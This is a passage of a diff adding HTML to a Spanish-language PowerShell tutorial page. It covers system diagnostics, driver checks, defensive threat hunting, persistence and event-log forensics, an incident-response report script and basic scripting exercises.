+<span class="comment"># Luego, elimínalo del sistema (usando el ejecutable 'sc')</span>
+<span class="command">sc.exe</span> <span class="string">delete</span> <span class="string">"CyberService"</span></pre>
+                        </li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección 4: Diagnóstico del Sistema -->
+        <section id="diagnostics" class="mb-12">
+            <h2 class="section-title">> Sección 4: Diagnóstico del Sistema - Escaneo de la Matrix</h2>
+            <div class="card">
+                <p>Un buen operador conoce su entorno. Estos cmdlets te permiten tomarle el pulso al sistema, revisar sus registros vitales y sus conexiones con el exterior.</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Get-WinEvent</h3>
+                <p>Permite leer los registros de eventos de Windows. Es una mina de oro para la investigación forense.</p>
+                <pre class="mt-2"><span class="comment"># Obtener los 10 últimos errores del registro del sistema</span>
+<span class="command">Get-WinEvent</span> <span class="parameter">-FilterHashtable</span> @{LogName=<span class="string">'System'</span>; Level=2} <span class="parameter">-MaxEvents</span> 10
+
+<span class="comment"># Buscar eventos de inicio de sesión fallidos (Event ID 4625)</span>
+<span class="command">Get-WinEvent</span> <span class="parameter">-FilterHashtable</span> @{LogName=<span class="string">'Security'</span>; ID=4625}</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Get-NetTCPConnection</h3>
+                <p>Muestra las conexiones de red TCP activas, similar al antiguo `netstat`.</p>
+                <pre class="mt-2"><span class="comment"># Mostrar todas las conexiones activas</span>
+<span class="command">Get-NetTCPConnection</span>
+
+<span class="comment"># Mostrar solo las conexiones establecidas a un puerto remoto 443 (HTTPS)</span>
+<span class="command">Get-NetTCPConnection</span> <span class="parameter">-RemotePort</span> 443 <span class="parameter">-State</span> Established</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Cmdlet: Test-NetConnection</h3>
+                <p>Una herramienta de diagnóstico de red todo en uno.</p>
+                <pre class="mt-2"><span class="comment"># Un simple ping a un servidor de Google</span>
+<span class="command">Test-NetConnection</span> <span class="parameter">-ComputerName</span> <span class="string">"8.8.8.8"</span>
+
+<span class="comment"># Comprobar si un puerto específico está abierto en un servidor</span>
+<span class="command">Test-NetConnection</span> <span class="parameter">-ComputerName</span> <span class="string">"google.com"</span> <span class="parameter">-Port</span> 443</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Análisis de Drivers: Audio, Video y Red</h3>
+                <p>Los drivers son la conexión entre el hardware y el sistema operativo. Un análisis exhaustivo puede revelar problemas de rendimiento, compatibilidad o seguridad.</p>
+                
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Drivers de Audio</h4>
+                <pre class="mt-2"><span class="comment"># Obtener información detallada de dispositivos de audio</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_SoundDevice</span> | <span class="command">Select-Object</span> <span class="parameter">Name, Status, Manufacturer, DeviceID</span>
+
+<span class="comment"># Verificar el servicio de audio de Windows</span>
+<span class="command">Get-Service</span> <span class="parameter">-Name</span> <span class="string">"AudioSrv"</span> | <span class="command">Select-Object</span> <span class="parameter">Name, Status, StartType</span>
+
+<span class="comment"># Listar drivers de audio específicos</span>
+<span class="command">Get-WmiObject</span> <span class="parameter">-Class</span> <span class="string">Win32_SystemDriver</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">Name</span> <span class="operator">-like</span> <span class="string">"*audio*"</span> } | <span class="command">Select-Object</span> <span class="parameter">Name, State, PathName</span></pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Drivers de Video/Gráficos</h4>
+                <pre class="mt-2"><span class="comment"># Información de la tarjeta gráfica y sus drivers</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_VideoController</span> | <span class="command">Select-Object</span> <span class="parameter">Name, DriverVersion, DriverDate, AdapterRAM, VideoModeDescription</span>
+
+<span class="comment"># Verificar problemas con drivers de video</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_PnPEntity</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">ConfigManagerErrorCode</span> <span class="operator">-ne</span> 0 <span class="operator">-and</span> <span class="variable">$_</span>.<span class="property">Name</span> <span class="operator">-like</span> <span class="string">"*display*"</span> }
+
+<span class="comment"># Obtener información de resolución actual</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_DesktopMonitor</span> | <span class="command">Select-Object</span> <span class="parameter">Name, ScreenHeight, ScreenWidth</span></pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Drivers de Red</h4>
+                <pre class="mt-2"><span class="comment"># Listar adaptadores de red y sus drivers</span>
+<span class="command">Get-NetAdapter</span> | <span class="command">Select-Object</span> <span class="parameter">Name, InterfaceDescription, LinkSpeed, MediaType, Status</span>
+
+<span class="comment"># Información detallada de drivers de red</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_NetworkAdapter</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">NetEnabled</span> <span class="operator">-eq</span> <span class="variable">$true</span> } | <span class="command">Select-Object</span> <span class="parameter">Name, Manufacturer, MACAddress, Speed</span>
+
+<span class="comment"># Verificar configuración IP de adaptadores activos</span>
+<span class="command">Get-NetIPConfiguration</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">NetAdapter</span>.<span class="property">Status</span> <span class="operator">-eq</span> <span class="string">"Up"</span> }</pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Script de Diagnóstico Integral</h4>
+                <p>Un script completo para generar un reporte de todos los drivers del sistema:</p>
+                <pre class="mt-2"><span class="comment"># Script de diagnóstico completo de drivers</span>
+<span class="variable">$reportPath</span> = <span class="string">"C:\Temp\DriverReport.txt"</span>
+<span class="variable">$timestamp</span> = <span class="command">Get-Date</span> <span class="parameter">-Format</span> <span class="string">"yyyy-MM-dd HH:mm:ss"</span>
+
+<span class="comment"># Crear archivo de reporte</span>
+<span class="string">"=== REPORTE DE DRIVERS DEL SISTEMA ==="</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span>
+<span class="string">"Generado: $timestamp"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+<span class="string">""</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="comment"># Drivers con problemas</span>
+<span class="string">"--- DRIVERS CON PROBLEMAS ---"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_PnPEntity</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">ConfigManagerErrorCode</span> <span class="operator">-ne</span> 0 } | <span class="command">Select-Object</span> <span class="parameter">Name, ConfigManagerErrorCode</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="comment"># Dispositivos de audio</span>
+<span class="string">"--- DISPOSITIVOS DE AUDIO ---"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_SoundDevice</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="command">Write-Host</span> <span class="string">"Reporte generado en: $reportPath"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Green</span></pre>
+
+                <div class="practical-activity">
+                    <h4 class="activity-title">>> Actividad Práctica #3: Análisis Completo del Entorno</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li>Busca en el registro de Seguridad si ha habido algún intento de inicio de sesión con una cuenta de usuario que no existe. ¿Qué ID de evento buscarías? (Pista: 4625).</li>
+                        
+                        <li>Ejecuta <code>Get-NetTCPConnection</code>. ¿Identificas alguna conexión a una dirección remota (<code>RemoteAddress</code>) que no reconozcas? Investiga la IP usando una web como whois.domaintools.com.</li>
+                        
+                        <li>Usa <code>Test-NetConnection</code> para verificar si tu equipo puede alcanzar el servidor DNS de Google (8.8.8.8) y si el puerto 53 (DNS) está abierto en ese servidor.
+                        <pre class="mt-2"><span class="command">Test-NetConnection</span> <span class="parameter">-ComputerName</span> <span class="string">"8.8.8.8"</span> <span class="parameter">-Port</span> 53</pre>
+                        </li>
+                        
+                        <li><strong>Diagnóstico de Drivers de Audio:</strong> Ejecuta el comando para listar dispositivos de audio. ¿Tienes algún dispositivo con estado "Problem" o "Unknown"?</li>
+                        
+                        <li><strong>Análisis de Video:</strong> Obtén información de tu tarjeta gráfica. ¿Cuál es la versión del driver? ¿Cuándo fue la última actualización? Busca online si es la versión más reciente.</li>
+                        
+                        <li><strong>Auditoría de Red:</strong> Usa <code>Get-NetAdapter</code> para verificar el estado de todos tus adaptadores de red. ¿Hay alguno deshabilitado que debería estar activo?</li>
+                        
+                        <li><strong>Reporte de Sistema:</strong> Ejecuta el script de diagnóstico integral para generar un reporte completo. Revisa el archivo generado en C:\Temp\ y identifica cualquier driver con problemas.</li>
+                        
+                        <li><strong>Investigación Forense:</strong> Combina <code>Get-CimInstance Win32_PnPEntity</code> con filtros para encontrar cualquier dispositivo con ConfigManagerErrorCode diferente de 0. Estos son dispositivos con problemas de drivers.</li>
+                    </ol>
+                    <div class="mt-4 p-3 bg-yellow-900 bg-opacity-30 border-l-4 border-yellow-500 rounded">
+                        <p class="text-yellow-300 text-sm">
+                            <strong>💡 Consejo del Hacker:</strong> Los drivers problemáticos son una puerta de entrada común para ataques. 
+                            Un driver desactualizado o mal configurado puede ser explotado para escalar privilegios o introducir malware en el sistema.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección 5: Ciberseguridad -->
+        <section id="cybersecurity" class="mb-12">
+            <h2 class="section-title">> Sección 5: PowerShell para Ciberseguridad - La Caza Digital</h2>
+            <div class="card">
+                <p>PowerShell es un arma de doble filo. Los atacantes lo aman por su poder y su presencia en todos los sistemas Windows modernos. Los defensores (como nosotros) lo usamos para cazar, auditar y fortalecer nuestras defensas.</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Reconocimiento: Enumeración de Usuarios</h3>
+                <p>Saber quién tiene acceso al sistema es el primer paso.</p>
+                <pre class="mt-2"><span class="comment"># Listar todas las cuentas de usuario locales</span>
+<span class="command">Get-LocalUser</span>
+
+<span class="comment"># Ver los miembros del grupo de Administradores locales</span>
+<span class="command">Get-LocalGroupMember</span> <span class="parameter">-Group</span> <span class="string">"Administradores"</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Análisis de Archivos: Cálculo de Hashes</h3>
+                <p>Un hash es una huella digital única para un archivo. Podemos usarla para verificar la integridad de un archivo o buscarlo en bases de datos de malware como VirusTotal.</p>
+                <pre class="mt-2"><span class="comment"># Crear un archivo de prueba</span>
+<span class="command">Set-Content</span> <span class="parameter">-Path</span> <span class="string">"C:\Temp\testfile.txt"</span> <span class="parameter">-Value</span> <span class="string">"this is a secret message"</span>
+
+<span class="comment"># Calcular su hash SHA256</span>
+<span class="command">Get-FileHash</span> <span class="parameter">-Path</span> <span class="string">"C:\Temp\testfile.txt"</span> <span class="parameter">-Algorithm</span> <span class="string">SHA256</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Auditoría: Información del Sistema con WMI/CIM</h3>
+                <p>WMI (Windows Management Instrumentation) y su sucesor CIM (Common Information Model) son interfaces que nos dan acceso a una cantidad masiva de información del sistema.</p>
+                <pre class="mt-2"><span class="comment"># Obtener la versión del sistema operativo y cuándo fue instalado</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_OperatingSystem</span> | <span class="command">Select-Object</span> <span class="parameter">Caption, InstallDate</span>
+
+<span class="comment"># Listar los parches de seguridad (HotFixes) instalados</span>
+<span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_QuickFixEngineering</span></pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Hunting de Amenazas: Detección de Actividad Sospechosa</h3>
+                <p>La caza de amenazas es un arte. Buscamos patrones, anomalías y señales que indiquen la presencia de un adversario en nuestro territorio digital.</p>
+                
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Procesos Sospechosos</h4>
+                <pre class="mt-2"><span class="comment"># Buscar procesos con alta utilización de CPU</span>
+<span class="command">Get-Process</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">CPU</span> <span class="operator">-gt</span> 100 } | <span class="command">Sort-Object</span> <span class="parameter">CPU</span> <span class="parameter">-Descending</span>
+
+<span class="comment"># Detectar procesos ejecutándose desde ubicaciones inusuales</span>
+<span class="command">Get-Process</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">Path</span> <span class="operator">-like</span> <span class="string">"*temp*"</span> <span class="operator">-or</span> <span class="variable">$_</span>.<span class="property">Path</span> <span class="operator">-like</span> <span class="string">"*downloads*"</span> }
+
+<span class="comment"># Procesos sin descripción (potencial malware)</span>
+<span class="command">Get-Process</span> | <span class="command">Where-Object</span> { <span class="operator">-not</span> <span class="variable">$_</span>.<span class="property">Description</span> } | <span class="command">Select-Object</span> <span class="parameter">Name, Path, Id</span></pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Análisis de Conexiones de Red</h4>
+                <pre class="mt-2"><span class="comment"># Conexiones a IPs externas sospechosas</span>
+<span class="command">Get-NetTCPConnection</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">State</span> <span class="operator">-eq</span> <span class="string">"Established"</span> <span class="operator">-and</span> <span class="variable">$_</span>.<span class="property">RemoteAddress</span> <span class="operator">-notlike</span> <span class="string">"127.*"</span> <span class="operator">-and</span> <span class="variable">$_</span>.<span class="property">RemoteAddress</span> <span class="operator">-notlike</span> <span class="string">"192.168.*"</span> }
+
+<span class="comment"># Puertos abiertos en modo escucha (posibles backdoors)</span>
+<span class="command">Get-NetTCPConnection</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">State</span> <span class="operator">-eq</span> <span class="string">"Listen"</span> } | <span class="command">Sort-Object</span> <span class="parameter">LocalPort</span>
+
+<span class="comment"># Correlacionar conexiones con procesos</span>
+<span class="command">Get-NetTCPConnection</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">State</span> <span class="operator">-eq</span> <span class="string">"Established"</span> } | <span class="command">ForEach-Object</span> {
+    <span class="variable">$proceso</span> = <span class="command">Get-Process</span> <span class="parameter">-Id</span> <span class="variable">$_</span>.<span class="property">OwningProcess</span> <span class="parameter">-ErrorAction</span> <span class="string">SilentlyContinue</span>
+    [<span class="string">PSCustomObject</span>]@{
+        <span class="property">LocalAddress</span> = <span class="variable">$_</span>.<span class="property">LocalAddress</span>
+        <span class="property">LocalPort</span> = <span class="variable">$_</span>.<span class="property">LocalPort</span>
+        <span class="property">RemoteAddress</span> = <span class="variable">$_</span>.<span class="property">RemoteAddress</span>
+        <span class="property">RemotePort</span> = <span class="variable">$_</span>.<span class="property">RemotePort</span>
+        <span class="property">ProcessName</span> = <span class="variable">$proceso</span>.<span class="property">Name</span>
+        <span class="property">ProcessPath</span> = <span class="variable">$proceso</span>.<span class="property">Path</span>
+    }
+}</pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Eventos de Seguridad Críticos</h4>
+                <pre class="mt-2"><span class="comment"># Intentos de inicio de sesión fallidos (posible ataque de fuerza bruta)</span>
+<span class="command">Get-WinEvent</span> <span class="parameter">-FilterHashtable</span> @{LogName=<span class="string">'Security'</span>; ID=4625; StartTime=(Get-Date).AddHours(-24)} | <span class="command">Group-Object</span> <span class="parameter">-Property</span> @{Expression={<span class="variable">$_</span>.Properties[5].Value}} | <span class="command">Sort-Object</span> <span class="parameter">Count</span> <span class="parameter">-Descending</span>
+
+<span class="comment"># Cambios en cuentas privilegiadas</span>
+<span class="command">Get-WinEvent</span> <span class="parameter">-FilterHashtable</span> @{LogName=<span class="string">'Security'</span>; ID=4732,4733,4728,4729; StartTime=(Get-Date).AddDays(-7)}
+
+<span class="comment"># Instalación de servicios (posible persistencia)</span>
+<span class="command">Get-WinEvent</span> <span class="parameter">-FilterHashtable</span> @{LogName=<span class="string">'System'</span>; ID=7045; StartTime=(Get-Date).AddDays(-1)}</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Forense Digital: Investigación de Incidentes</h3>
+                <p>Cuando algo ha ido mal, necesitamos ser detectives digitales. Cada bit cuenta, cada timestamp es una pista.</p>
+                
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Timeline de Actividad del Sistema</h4>
+                <pre class="mt-2"><span class="comment"># Archivos modificados recientemente (posible exfiltración)</span>
+<span class="command">Get-ChildItem</span> <span class="parameter">-Path</span> <span class="string">"C:\Users"</span> <span class="parameter">-Recurse</span> <span class="parameter">-File</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">LastWriteTime</span> <span class="operator">-gt</span> (Get-Date).AddHours(-6) } | <span class="command">Sort-Object</span> <span class="parameter">LastWriteTime</span> <span class="parameter">-Descending</span>
+
+<span class="comment"># Archivos ejecutables en ubicaciones sospechosas</span>
+<span class="command">Get-ChildItem</span> <span class="parameter">-Path</span> <span class="string">"C:\Users"</span> <span class="parameter">-Recurse</span> <span class="parameter">-Include</span> <span class="string">"*.exe", "*.bat", "*.ps1", "*.vbs"</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">Directory</span>.<span class="property">Name</span> <span class="operator">-like</span> <span class="string">"*temp*"</span> <span class="operator">-or</span> <span class="variable">$_</span>.<span class="property">Directory</span>.<span class="property">Name</span> <span class="operator">-like</span> <span class="string">"*downloads*"</span> }</pre>
+
+                <h4 class="text-lg font-semibold mt-4 mb-2 text-cyan-400">Análisis de Persistencia</h4>
+                <pre class="mt-2"><span class="comment"># Verificar tareas programadas sospechosas</span>
+<span class="command">Get-ScheduledTask</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">State</span> <span class="operator">-eq</span> <span class="string">"Ready"</span> <span class="operator">-and</span> <span class="variable">$_</span>.<span class="property">Author</span> <span class="operator">-notlike</span> <span class="string">"*Microsoft*"</span> }
+
+<span class="comment"># Entradas de inicio automático en el registro</span>
+<span class="command">Get-ItemProperty</span> <span class="parameter">-Path</span> <span class="string">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span>
+<span class="command">Get-ItemProperty</span> <span class="parameter">-Path</span> <span class="string">"HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span>
+
+<span class="comment"># Servicios instalados recientemente</span>
+<span class="command">Get-WmiObject</span> <span class="parameter">-Class</span> <span class="string">Win32_Service</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">Caption</span> <span class="operator">-notlike</span> <span class="string">"*Microsoft*"</span> <span class="operator">-and</span> <span class="variable">$_</span>.<span class="property">Caption</span> <span class="operator">-notlike</span> <span class="string">"*Windows*"</span> }</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Script de Respuesta a Incidentes</h3>
+                <p>Un script automático para respuesta rápida cuando detectas una brecha de seguridad.</p>
+                <pre class="mt-2"><span class="comment"># === SCRIPT DE RESPUESTA A INCIDENTES ===</span>
+<span class="comment"># Nombre: IncidentResponse.ps1</span>
+
+<span class="variable">$reportPath</span> = <span class="string">"C:\Temp\IncidentReport_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"</span>
+
+<span class="command">Write-Host</span> <span class="string">"🚨 INICIANDO RESPUESTA A INCIDENTES..."</span> <span class="parameter">-ForegroundColor</span> <span class="string">Red</span>
+
+<span class="comment"># 1. Snapshot del sistema</span>
+<span class="string">"=== SNAPSHOT DEL SISTEMA ==="</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span>
+<span class="string">"Fecha: $(Get-Date)"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="comment"># 2. Procesos activos</span>
+<span class="string">"--- PROCESOS ACTIVOS ---"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+<span class="command">Get-Process</span> | <span class="command">Select-Object</span> <span class="parameter">Name, Id, CPU, WorkingSet, Path</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="comment"># 3. Conexiones de red</span>
+<span class="string">"--- CONEXIONES DE RED ---"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+<span class="command">Get-NetTCPConnection</span> | <span class="command">Where-Object</span> { <span class="variable">$_</span>.<span class="property">State</span> <span class="operator">-eq</span> <span class="string">"Established"</span> } | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="comment"># 4. Eventos críticos recientes</span>
+<span class="string">"--- EVENTOS CRÍTICOS (ÚLTIMAS 2 HORAS) ---"</span> | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+<span class="command">Get-WinEvent</span> <span class="parameter">-FilterHashtable</span> @{LogName=<span class="string">'Security'</span>; Level=2; StartTime=(Get-Date).AddHours(-2)} <span class="parameter">-MaxEvents</span> 50 | <span class="command">Out-File</span> <span class="parameter">-FilePath</span> <span class="variable">$reportPath</span> <span class="parameter">-Append</span>
+
+<span class="command">Write-Host</span> <span class="string">"📋 Reporte generado: $reportPath"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Green</span>
+
+<span class="comment"># 5. Aislar sistema (desconectar interfaces de red)</span>
+<span class="comment"># ¡USAR CON PRECAUCIÓN! Esto desconectará el sistema de la red</span>
+<span class="comment"># Get-NetAdapter | Disable-NetAdapter -Confirm:$false</span></pre>
+
+                <div class="mt-4 p-4 bg-red-900 bg-opacity-30 border-l-4 border-red-500 rounded">
+                    <h5 class="font-bold text-red-400 mb-2">⚠️ ADVERTENCIA DE SEGURIDAD</h5>
+                    <p class="text-red-300 text-sm">
+                        Las técnicas mostradas son poderosas herramientas de defensa. Úsalas solo en sistemas que poseas o tengas autorización explícita para auditar. 
+                        El uso no autorizado de estas técnicas puede ser ilegal. Con gran poder viene gran responsabilidad.
+                    </p>
+                </div>
+
+                <div class="practical-activity">
+                    <h4 class="activity-title">>> Actividad Práctica #4: Operación de Auditoría y Caza de Amenazas</h4>
+                    <ol class="list-decimal list-inside mt-4 text-gray-300 text-shadow-none">
+                        <li><strong>Auditoría de Usuarios:</strong> Ejecuta el comando para listar los miembros del grupo de Administradores. ¿Reconoces todas las cuentas? ¿Hay alguna que no debería estar ahí?</li>
+                        
+                        <li><strong>Análisis de Hash:</strong> Descarga una herramienta legítima de Internet (por ejemplo, el instalador de 7-Zip). Antes de ejecutarla, calcula su hash SHA256. Luego, busca ese hash en VirusTotal.com para ver si es reconocido como seguro.</li>
+                        
+                        <li><strong>Timeline del Sistema:</strong> Usa <code>Get-CimInstance</code> para averiguar la fecha y hora exactas en que el equipo se inició por última vez.
+                        <pre class="mt-2"><span class="command">Get-CimInstance</span> <span class="parameter">-ClassName</span> <span class="string">Win32_OperatingSystem</span> | <span class="command">Select-Object</span> <span class="parameter">LastBootUpTime</span></pre>
+                        </li>
+                        
+                        <li><strong>Hunting de Procesos:</strong> Ejecuta el comando para detectar procesos sin descripción. Investiga cualquier proceso sospechoso que encuentres. ¿Reconoces todos los procesos listados?</li>
+                        
+                        <li><strong>Análisis de Red:</strong> Usa el script para correlacionar conexiones con procesos. ¿Hay alguna conexión a una IP externa que no reconozcas? Anota las IPs sospechosas para investigar.</li>
+                        
+                        <li><strong>Detección de Persistencia:</strong> Ejecuta <code>Get-ScheduledTask</code> para verificar tareas programadas no creadas por Microsoft. ¿Hay alguna tarea sospechosa? ¿Reconoces todas las tareas del sistema?</li>
+                        
+                        <li><strong>Forense de Archivos:</strong> Busca archivos ejecutables (.exe, .bat, .ps1) en las carpetas Temp y Downloads usando el comando proporcionado. ¿Hay archivos que no deberían estar ahí?</li>
+                        
+                        <li><strong>Análisis de Eventos:</strong> Busca en el registro de seguridad los eventos de "Inicio de sesión exitoso" (ID 4624) de tu propio usuario en las últimas 24 horas. ¿Coinciden con las horas en que has estado usando el equipo?</li>
+                        
+                        <li><strong>Respuesta a Incidentes:</strong> Ejecuta el script completo de respuesta a incidentes. Revisa el reporte generado y familiarízate con la información recopilada.</li>
+                        
+                        <li><strong>Investigación Avanzada:</strong> Ejecuta el comando para detectar intentos de inicio de sesión fallidos en las últimas 24 horas. Si encuentras alguno, ¿puedes identificar el patrón? ¿Desde qué IP o usuario?</li>
+                    </ol>
+                    
+                    <div class="mt-6 p-4 bg-purple-900 bg-opacity-30 border-l-4 border-purple-500 rounded">
+                        <h5 class="font-bold text-purple-400 mb-2">🎯 Misión Especial: Crear tu SOC Personal</h5>
+                        <p class="text-purple-300 text-sm mb-3">
+                            Combina todas las técnicas aprendidas en un script personalizado de monitoreo continuo. 
+                            Tu script debe verificar procesos sospechosos, conexiones anómalas, y eventos de seguridad críticos.
+                        </p>
+                        <div class="text-xs text-purple-200">
+                            <p><strong>Bonus:</strong> Programa tu script para que se ejecute automáticamente cada hora usando tareas programadas de Windows. 
+                            ¡Construye tu propio Security Operations Center (SOC) personal!</p>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-4 p-3 bg-orange-900 bg-opacity-30 border-l-4 border-orange-500 rounded">
+                        <p class="text-orange-300 text-sm">
+                            <strong>🛡️ Nota Ética:</strong> Estas técnicas están diseñadas para defender sistemas, no para atacarlos. 
+                            Úsalas responsablemente y solo en sistemas que tengas derecho a auditar. 
+                            La ciberseguridad es sobre proteger, no sobre explotar.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección 6: Automatización de Tareas -->
+        <section id="automation" class="mb-12">
+            <h2 class="section-title">> Sección 6: Automatización de Tareas - Scripts de Poder</h2>
+            <div class="card">
+                <p>La verdadera fuerza de PowerShell radica en su capacidad de automatización. Un script bien construido puede ejecutar en segundos lo que tomaría horas hacer manualmente.</p>
+                
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Variables y Bucles</h3>
+                <p>Las variables almacenan datos temporalmente. Los bucles nos permiten repetir acciones.</p>
+                <pre class="mt-2"><span class="comment"># Definir una variable con una lista de servicios críticos</span>
+<span class="variable">$serviciosCriticos</span> = @(<span class="string">"Spooler"</span>, <span class="string">"BITS"</span>, <span class="string">"Themes"</span>, <span class="string">"AudioSrv"</span>)
+
+<span class="comment"># Bucle foreach para verificar el estado de cada servicio</span>
+<span class="keyword">foreach</span> (<span class="variable">$servicio</span> <span class="keyword">in</span> <span class="variable">$serviciosCriticos</span>) {
+    <span class="variable">$estado</span> = <span class="command">Get-Service</span> <span class="parameter">-Name</span> <span class="variable">$servicio</span>
+    <span class="command">Write-Host</span> <span class="string">"$servicio está: $($estado.Status)"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Cyan</span>
+}</pre>
+
+                <h3 class="text-xl font-bold mt-6 mb-2 text-pink-500">Condicionales: If, ElseIf, Else</h3>
+                <p>Las estructuras condicionales permiten que nuestros scripts tomen decisiones.</p>
+                <pre class="mt-2"><span class="comment"># Script para verificar y alertar sobre el uso de CPU</span>
+<span class="variable">$cpu</span> = <span class="command">Get-WmiObject</span> <span class="parameter">-Class</span> <span class="string">Win32_Processor</span> | <span class="command">Measure-Object</span> <span class="parameter">-Property</span> LoadPercentage <span class="parameter">-Average</span>
+<span class="variable">$usoCPU</span> = <span class="variable">$cpu</span>.Average
+
+<span class="keyword">if</span> (<span class="variable">$usoCPU</span> <span class="operator">-gt</span> 80) {
+    <span class="command">Write-Host</span> <span class="string">"¡ALERTA! CPU al $usoCPU%"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Red</span>
+} <span class="keyword">elseif</span> (<span class="variable">$usoCPU</span> <span class="operator">-gt</span> 50) {
+    <span class="command">Write-Host</span> <span class="string">"CPU moderada: $usoCPU%"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Yellow</span>
+} <span class="keyword">else</span> {
+    <span class="command">Write-Host</span> <span class="string">"CPU normal: $usoCPU%"</span> <span class="parameter">-ForegroundColor</span> <span class="string">Green</span>
+}</pre>
+
+                <div class="practical-activity">
+                    <h4 class="activity-title">>> Actividad Práctica #5: Script de Monitoreo</h4>
+                    <p class="mt-4 text-gray-300">Crea un script que combine múltiples verificaciones del sistema:</p>
+                    <pre class="mt-2"><span class="comment"># Script de monitoreo completo</span>
+<span class="variable">$servicios</span> = @(<span class="string">"Spooler"</span>, <span class="string">"BITS"</span>, <span class="string">"Themes"</span>)
+<span class="variable">$procesosProhibidos</span> = @(<span class="string">"mining*"</span>, <span class="string">"hack*"</span>)
+
+<span class="comment"># Verificar servicios</span>
